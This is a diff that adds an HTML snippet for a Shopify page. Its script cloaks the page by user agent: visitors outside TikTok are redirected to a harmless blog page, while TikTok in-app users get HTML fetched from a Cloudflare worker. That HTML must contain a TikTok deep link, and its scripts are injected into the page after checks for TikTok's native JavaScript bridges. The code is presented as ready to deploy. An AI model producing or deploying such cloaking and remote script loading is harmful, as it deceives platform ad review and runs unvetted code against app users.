@@ -1,0 +1,78 @@
+<body>
+<!--
+  Paste this into the Shopify page body (Online Store -> Pages -> "go" -> HTML view).
+  BEFORE DEPLOY: set WORKER_URL below to the deployed worker origin (e.g. https://gravy-clone.<subdomain>.workers.dev).
+  The ad points at https://<store>.myshopify.com/pages/go (k param optional; auto-added for TikTok UA).
+-->
+
+
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<style>html,body{background:transparent!important;min-height:100%;min-height:100dvh}body{margin:0}</style>
+
+
+<script>
+(async () => {
+  const WORKER_URL = 'https://gravy-clone.3wingsandchips.workers.dev';
+  const FALLBACK = '/blogs/news';                     // benign page on this same store
+  const incoming = new URL(location.href);
+  const inTikTok = /TikTok|musical_ly|musically|BytedanceWebview|trill|aweme/i.test(navigator.userAgent);
+  if (!inTikTok) { location.replace(FALLBACK); return; }
+  if (!incoming.searchParams.get('k')) {
+    incoming.searchParams.set('k', 'demo');
+    location.replace(incoming.href);
+    return;
+  }
+  const visit = crypto.randomUUID();
+  let running = false, attempts = 0;
+  async function open() {
+    if (running) return;
+    running = true;
+    attempts++;
+    try {
+      const response = await fetch(WORKER_URL + '/shopify-entry', {
+        method: 'POST', credentials: 'omit', cache: 'no-store',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ entryURL: incoming.href, requestId: visit }),
+        signal: AbortSignal.timeout(12000),
+      });
+      if (!response.ok) throw Error('Entry unavailable');
+      const data = await response.json();
+      if (!data.authorized) { location.replace(data.fallback); return; }
+      if (typeof data.entryHTML !== 'string' || !data.entryHTML.includes('snssdk1233://webview')) throw Error('Handoff unavailable');
+      if (data.preserveNativeContext) {
+        if (window.__gravyEntryMounted) return;
+        const parsed = new DOMParser().parseFromString(data.entryHTML, 'text/html');
+        if (!parsed.body || !parsed.body.querySelector('script')) throw Error('Missing entry scripts');
+        if ([...parsed.scripts].some(s => s.src)) throw Error('Unexpected external entry script');
+        window.__gravyEntryMounted = true;
+        window.__gravyEntryLoader = 'in_place_v1';
+        window.__gravyBridgeBefore = {
+          JS2Native: !!window.JS2NativeBridge,
+          toutiao: !!window.ToutiaoJSBridge,
+          jsCall: !!(window.JSBridge && typeof window.JSBridge.call === 'function'),
+          bridgeFrames: !!document.querySelector('iframe[id*="JSBridge"]'),
+        };
+        for (const style of parsed.head.querySelectorAll('style')) document.head.appendChild(style.cloneNode(true));
+        for (const node of [...parsed.body.childNodes]) {
+          if (node.nodeType === 1 && node.tagName === 'SCRIPT') {
+            const script = document.createElement('script');
+            script.textContent = node.textContent;
+            script.dataset.gravyEntry = 'in-place';
+            document.body.appendChild(script);
+          } else document.body.appendChild(node.cloneNode(true));
+        }
+      } else {
+        document.open(); document.write(data.entryHTML); document.close();
+      }
+    } catch {
+      if (attempts < 3) setTimeout(open, attempts * 500);
+    } finally {
+      running = false;
+    }
+  }
+  await open();
+})();
+</script>
+
+
+</body>
